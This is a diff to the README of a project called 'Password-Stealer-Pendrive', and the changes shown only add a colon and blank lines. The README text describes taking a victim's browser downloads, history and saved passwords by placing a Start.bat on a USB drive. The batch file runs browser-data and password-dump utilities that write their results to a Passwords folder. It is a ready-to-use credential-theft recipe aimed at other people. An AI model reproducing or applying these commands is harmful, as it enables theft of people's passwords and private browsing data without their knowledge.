@@ -1,7 +1,8 @@
 # Password-Stealer-Pendrive
 
 
-By using this process you can get the victims
+By using this process you can get the victims:
+
       Browser Downloads
       Browser History
       Browser Saved Passwords
@@ -42,6 +43,7 @@ then create a file named  Start.bat
 Open Start.bat with notepad
 
 Finally paste the code below:
+
       start BrowserDownloadsView.exe /stext Passwords\BrowserDownloads.txt
       start BrowsingHistoryView.exe /stext Passwords\BrowsingHistory.txt
       start ChromePass.exe /stext Passwords\ChromePass.txt
